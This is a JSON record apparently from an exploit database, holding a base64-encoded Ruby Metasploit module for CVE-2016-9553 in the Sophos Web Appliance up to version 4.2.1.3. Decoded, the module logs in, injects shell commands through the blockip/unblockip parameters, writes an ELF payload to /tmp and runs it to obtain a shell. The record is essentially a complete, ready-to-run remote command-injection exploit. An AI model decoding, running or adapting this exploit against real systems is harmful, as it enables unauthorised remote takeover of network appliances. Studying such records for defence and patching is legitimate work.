{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBTb3Bob3MgV2ViIEFwcGxpYW5jZSBVbkJsb2NrL0Jsb2NrLUlQIFJlbW90ZSBDb21tYW5kIEluamVjdGlvbiBWdWxuZXJhYmxpdHkgDQojIERhdGU6IDEyLzEyLzIwMTYNCiMgRXhwbG9pdCBBdXRob3I6IHhvcnQgQCBDcml0aWNhbCBTdGFydA0KIyBWZW5kb3IgSG9tZXBhZ2U6IHd3dy5zb3Bob3MuY29tIA0KIyBTb2Z0d2FyZSBMaW5rOiBzb3Bob3MuY29tL2VuLXVzL3Byb2R1Y3RzL3NlY3VyZS13ZWItZ2F0ZXdheS5hc3B4DQojIFZlcnNpb246IDQuMi4xLjMNCiMgVGVzdGVkIG9uOiA0LjIuMS4zDQojICAgICAgICAgICAgDQojIENWRSA6IENWRS0yMDE2LTk1NTMNCg0KIyB2dWxuIDE6IHVuYmxvY2tpcCBwYXJhbWV0ZXIgLyBNZ3JSZXBvcnQucGhwIGV4cGxvaXQNCiMgdnVsbiAyOiBibG9ja2lwIHBhcmFtZXRlciAgIC8gTWdyUmVwb3J0LnBocCBleHBsb2l0DQoNCiMgRGVzY3JpcHRpb24gUG9zdEF1dGggU29waG9zIFdlYiBBcHAgRlcgPD0gdjQuMi4xLjMgZm9yIGNhcGFibGl0aWVzLiBUaGlzIGV4cGxvaXQgbGV2ZXJhZ2VzIGEgY29tbWFuZCBpbmplY3Rpb24gYnVnLiANCiMNCiMgeG9ydCBAIENyaXRpY2FsIFN0YXJ0DQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KDQpjbGFzcyBNZXRhc3Bsb2l0TW9kdWxlIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gRXhjZWxsZW50UmFua2luZw0KCWluY2x1ZGUgIEV4cGxvaXQ6OlJlbW90ZTo6VGNwDQogICAgICAgIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCg0KCWRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCgkJc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCgkJCSdOYW1lJyAgICAgICAgICAgPT4gJ1NvcGhvcyBXZWIgQXBwbGlhY2UgPD0gdjQuMi4xLjMgYmxvY2svdW5ibG9jayByZW1vdGUgZXhwbG9pdCcsDQoJCQkJCSdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQoJCQkJCVRoaXMgbW9kdWxlIGV4cGxvaXRzIHR3byAyIHNlcGVyYXRlIHJlbW90ZSBjb21tYW5kIGluamVjZWN0aW9uIHZ1bG5lcmFiaWxpdGllcyBpbg0KCQkJCXRoZSBTb3Bob3MgV2ViIEFwcGxpYWNlIFZlcnNpb24gPD0gIHY0LjIuMS4zIHRoZSB3ZWIgYWRtaW5pc3RyYXRpb24gaW50ZXJmYWNlLg0KCQkJCQlCeSBzZW5kaW5nIGEgc3BlY2lhbGx5IGNyYWZ0ZWQgcmVxdWVzdCBpdCdzIHBvc3NpYmxlIHRvIGluamVjdCBzeXN0ZW0NCgkJCQkgY29tbWFuZHMgDQoJCQl9LA0KCQkJJ0F1dGhvcicgICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJJ3hvcnQnLCAjIHZ1bG4gKyBtZXRhc3Bsb2l0IG1vZHVsZQ0KCQkJCV0sDQoJCQknVmVyc2lvbicgICAgICAgID0+ICckUmV2aXNpb246IDIgJCcsDQoJCQknUmVmZXJlbmNlcycgICAgID0+DQoJCQkJWw0KCQkJCQlbICdub25lJywgJ25vbmUnXSwNCgkJCQldLA0KCQkJJ1BsYXRmb3JtJyAgICAgID0+IFsgJ2xpbnV4J10sDQoJCQknUHJpdmlsZWdlZCcgICAgID0+IHRydWUsDQoJCQkgJ0FyY2gnICAgICAgICAgID0+IFsgQVJDSF9YODYgXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICdTZXNzaW9uVHlwZXMnICA9PiBbICdzaGVsbCcgXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICdQcml2aWxlZ2VkJyAgICAgPT4gZmFsc2UsDQoNCgkJICAgICAgICAnUGF5bG9hZCcgICAgICAgID0+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbXBhdCcgPT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0Nvbm5lY3Rpb25UeXBlJyA9PiAnZmluZCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LA0KDQoJCQknVGFyZ2V0cycgICAgICAgID0+DQoJCQkJWw0KCQkJCQlbDQoJCQkJCQknYmxvY2tpcCBtZXRob2QnLA0KCQkJCQkJew0KCQkJCQkJCQknQXJjaCcgPT4gQVJDSF9YODYsDQoJCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ2xpbnV4JywNCgkJCQkJCQkJJ1Z1bG5OYW1lJyA9PiAnYmxvY2tpcCcsDQoJCQkJCQkJCSdWdWxuTnVtJyA9PiAnMScsDQoJCQkJCQl9LA0KCQkJCQldLAkNCgkJCQkJWw0KCQkJCQkJJ3VuYmxvY2tpcCBtZXRob2QnLA0KCQkJCQkJew0KCQkJCQkJCQknQXJjaCcgPT4gQVJDSF9YODYsDQoJCQkJCQkJCSdQbGF0Zm9ybScgPT4gJ2xpbnV4JywNCgkJCQkJCQkJJ1Z1bG5OYW1lJyA9PiAndW5ibG9ja2lwJywNCgkJCQkJCQkJJ1Z1bG5OdW0nID0+ICcyJywNCgkJCQkJCX0sDQoJCQkJCV0sDQoJCQkJXSwNCgkJCSdEZWZhdWx0VGFyZ2V0JyA9PiAwKSkNCg0KCQkJcmVnaXN0ZXJfb3B0aW9ucygNCgkJCQlbDQoJCQkJCU9wdFN0cmluZy5uZXcoJ1BBU1NXT1JEJywgWyBmYWxzZSwgJ0RldmljZSBwYXNzd29yZCcsICIiIF0pLAkNCgkJCSAgICAgICAgIAlPcHRTdHJpbmcubmV3KCdVU0VSTkFNRScsIFsgdHJ1ZSwgJ0RldmljZSBwYXNzd29yZCcsICJhZG1pbiIgXSksCQ0KCQkJCQlPcHRTdHJpbmcubmV3KCdDTUQnLCBbIGZhbHNlLCAnQ29tbWFuZCB0byBleGVjdXRlJywgIiIgXSksCQ0KCQkJCQlPcHQ6OlJQT1JUKDQ0MyksDQoJCQkJXSwgc2VsZi5jbGFzcykNCgllbmQNCg0KDQogICAgICAgIGRlZiBkb19sb2dpbih1c2VybmFtZSwgcGFzc3dvcmRfY2xlYXIpDQogICAgICAgICAgICAgICAgdnByaW50X3N0YXR1cyggIkxvZ2dpbmcgaW50byBtYWNoaW5lIHdpdGggY3JlZGVudGlhbHMuLi5cbiIgKQ0KDQogICAgICAgICAgICAgICAgIyB2YXJzDQogICAgICAgICAgICAgICAgdGltZW91dCA9IDExNTUwOw0KICAgICAgICAgICAgICAgIHN0eWxlX2tleSA9IFJleDo6VGV4dC5yYW5kX3RleHRfaGV4KDMyKQ0KDQogICAgICAgICAgICAgICAgIyBzZW5kIHJlcXVlc3QgIA0KICAgICAgICAgICAgICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnICA9PiAnUE9TVCcsDQogICAgICAgICAgICAgICAgICAgICAgJ3VyaScgICAgID0+ICIvaW5kZXgucGhwIiwNCiAgICAgICAgICAgICAgICAgICAgICAndmFyc19nZXQnID0+IHsNCgkJCSAgICdjJyA9PiAnbG9naW4nLA0KCQkJfSwNCiAgICAgICAgICAgICAgICAgICAgICAndmFyc19wb3N0JyA9Pg0KICAgICAgICAgICAgICAgICAgICAgICAgew0KDQogICAgICAgCQkJICAnU1RZTEUnID0+IHN0eWxlX2tleSwNCiAJCQkgICdkZXN0aW5hdGlvbicgPT4gJycsDQoJCQkgICd1c2VybmFtZScgPT4gdXNlcm5hbWUsDQoJCQkgICdwYXNzd29yZCcgPT4gcGFzc3dvcmRfY2xlYXIsDQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSwgdGltZW91dCkNCg0KICAgICAgICAgICAgICAgIHJldHVybiBzdHlsZV9rZXkNCiAgICAgICAgZW5kDQoNCglkZWYgcnVuX2NvbW1hbmQodXNlcm5hbWUsIHN0eWxlX3Bhc3N3b3JkLCBjbWQpDQoJCXZwcmludF9zdGF0dXMoICJSdW5uaW5nIENvbW1hbmQuLi5cbiIgKQ0KDQoJCSMgcmFuZG9tIGF0dGFjayBtZXRob2QgZnJvbSBjYWxsaW5nIG1ldGhvZHMgaW50byAgDQoJCWNhbGxpbmdfY29tbWFuZHMgPSBbICdyZXBvcnQnLCd0cmVuZF92b2x1bWUnLCd0cmVuZF9zdXNwZWN0JywndG9wX2FwcF9jdHJsJywncGVyZl9sYXRlbmN5JywncGVyZl90aHJvdWdocHV0JywndXNlcnNfYnJvd3NlX3N1bW1hcnknLCd0cmFmX3NpdGVzJywndHJhZl9ibG9ja2VkJywndHJhZl91c2VycycsJ3VzZXJzX3ZpcnVzX2Rvd25sb2FkZXJzJywndXNlcnNfcHVhX2Rvd25sb2FkZXJzJywndXNlcnNfaGlnaHJpc2snLCd1c2Vyc19wb2xpY3lfdmlvbGF0b3JzJywndXNlcnNfdG9wX3VzZXJzX2J5X2Jyb3dzZV90aW1lJywndXNlcnNfcXVvdGEnLCd1c2Vyc19icm93c2VfdGltZV9ieV91c2VyJywndXNlcnNfdG9wX3VzZXJzX2J5X2NhdGVnb3J5JywndXNlcnNfc2l0ZV92aXNpdHNfYnlfdXNlcicsJ3VzZXJzX2NhdGVnb3J5X3Zpc2l0c19ieV91c2VyJywndXNlcnNfbW9uaXRvcmVkX3NlYXJjaF9xdWVyaWVzJywndXNlcnNfYXBwX2N0cmwnLCd0cmFmX2NhdGVnb3J5JywndHJhZl9kb3dubG9hZCcgLCd3YXJuZWRfc2l0ZXMnIF0NCg0KCQkjIHNlbGVjdCByYW5kb20gY2FsbGluZyBwYWdlIHRoYXQgY2FsbHMgdGhlIHZ1bG5lcmFibGUgcGFnZSBNZ3JSZXBvcnQucGhwIHdoZXJlIHRoZSB2dWxucyBhcmUNCgkJYXR0YWNrX21ldGhvZCA9IGNhbGxpbmdfY29tbWFuZHNbcmFuZChjYWxsaW5nX2NvbW1hbmRzLmxlbmd0aCldDQoNCiAgICAgICAgICAgICAgICAjIHJhbmRvbSBmaWxlbmFtZSB0byBkdW1wIHRvbyArICd0bXAnIEhBUyB0byBiZSBoZXJlLg0KICAgICAgICAgICAgICAgIGI2NGR1bXBmaWxlID0gIi90bXAvIiArIHJhbmRfdGV4dF9hbHBoYW51bWVyaWMoNCtyYW5kKDQpKQ0KDQoJCXZwcmludF9zdGF0dXMoICJBdHRhY2tpbmcgVnVsbiAjIiArIHRhcmdldFsnVnVsbk51bSddKyAiIC0gIiArIHRhcmdldFsnVnVsbk5hbWUnXSArICIgd2l0aCAiICsgYXR0YWNrX21ldGhvZCAgKyAiY29tbWFuZCBtZXRob2QiICkNCgkJcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQoJCQknbWV0aG9kJyA9PiAnR0VUJywNCgkJCSd1cmknID0+ICcvaW5kZXgucGhwP2M9dHJlbmRfc3VzcGVjdCYnICsgdGFyZ2V0WydWdWxuTmFtZSddICsgJz0xLjIuMy42YCcrIGNtZCArJ2AmU1RZTEU9JytzdHlsZV9wYXNzd29yZA0KCQl9KQ0KDQoJZW5kDQoNCglkZWYgZXhwbG9pdA0KCQkjIHRpbWVvdXQNCgkJdGltZW91dCA9IDE1NTA7DQoNCgkJIyBwYXJhbXMNCgkJcGFzc3dvcmRfY2xlYXIgPSBkYXRhc3RvcmVbJ1BBU1NXT1JEJ10NCgkJdXNlciA9IGRhdGFzdG9yZVsnVVNFUk5BTUUnXQ0KCQkNCgkJc3R5bGVfaGFzaCA9IGRvX2xvZ2luKHVzZXIsIHBhc3N3b3JkX2NsZWFyKQ0KCQ0KCQl2cHJpbnRfc3RhdHVzKCJTVEFUVVMgaGFzaCBhdXRoZW50aWNhdGVkOiAje3N0eWxlX2hhc2h9XG4iKQ0KDQoJCXNsZWVwKDUpDQoNCgkJICNpZiBubyAnQ01EJyBzdHJpbmcgLSBhZGQgY29kZSBmb3Igcm9vdCBzaGVsbA0KICAgICAgICAgICAgICAgIGlmIG5vdCBkYXRhc3RvcmVbJ0NNRCddLm5pbD8gYW5kIG5vdCBkYXRhc3RvcmVbJ0NNRCddLmVtcHR5Pw0KDQogICAgICAgICAgICAgICAgICAgICAgICBjbWQgPSBkYXRhc3RvcmVbJ0NNRCddDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICMgRW5jb2RlIGNtZCBwYXlsb2FkDQogICAgICAgICAgICAgICAgICAgICAgICBlbmNvZGVkX2NtZCA9IGNtZC51bnBhY2soIkgqIikuam9pbigpLmdzdWIoLyhcdykoXHcpLywnXFx4XDFcMicpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICMga2lsbCBzdGFsZSBjYWxscyB0byBiZHVtcCBmcm9tIHByZXZpb3VzIGV4cGxvaXQgY2FsbHMgZm9yIHJlLXVzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcnVuX2NvbW1hbmQodXNlciwgc3R5bGVfaGFzaCwgKCJzdWRvIC9iaW4vcm0gLWYgL3RtcC9uIDtwcmludGYgXCIje2VuY29kZWRfY21kfVwiID4gL3RtcC9uOyBjaG1vZCArcnggL3RtcC9uIDsgL3RtcC9uIiApKQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICMgRW5jb2RlIHBheWxvYWQgdG8gRUxGIGZpbGUgZm9yIGRlcGxveW1lbnQNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsZiA9IE1zZjo6VXRpbDo6RVhFLnRvX2xpbnV4X3g4Nl9lbGYoZnJhbWV3b3JrLCBwYXlsb2FkLnJhdykNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuY29kZWRfZWxmID0gZWxmLnVucGFjaygiSCoiKS5qb2luKCkuZ3N1YigvKFx3KShcdykvLCdcXFxcXFx4XDFcMicpDQoNCgkJCSMgdXBsb2FkIGVsZiB0byAvdG1wL20gLCBjaG1vZCArcnggL3RtcC9tICwgdGhlbiBydW4gL3RtcC9tIChwYXlsb2FkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcnVuX2NvbW1hbmQodXNlciwgc3R5bGVfaGFzaCwgKCJlY2hvJTIwLWUlMjAje2VuY29kZWRfZWxmfVw+JTIwL3RtcC9tXDtjaG1vZCUyMCUyYnJ4JTIwL3RtcC9tXDsvdG1wL20iKSkNCgkJCSMgd2FpdCBmb3IgbWFnaWMNCiAgICAgICAgICAgICAgICAgICAgICAgIGhhbmRsZXINCgkJCQ0KICAgICAgICAgICAgICAgIGVuZA0KDQoNCgllbmQNCmVuZA==", 
    "filename": "platforms/php/webapps/41413.rb", 
    "id": "41413", 
    "cves": [
        "CVE-2016-9553"
    ]
}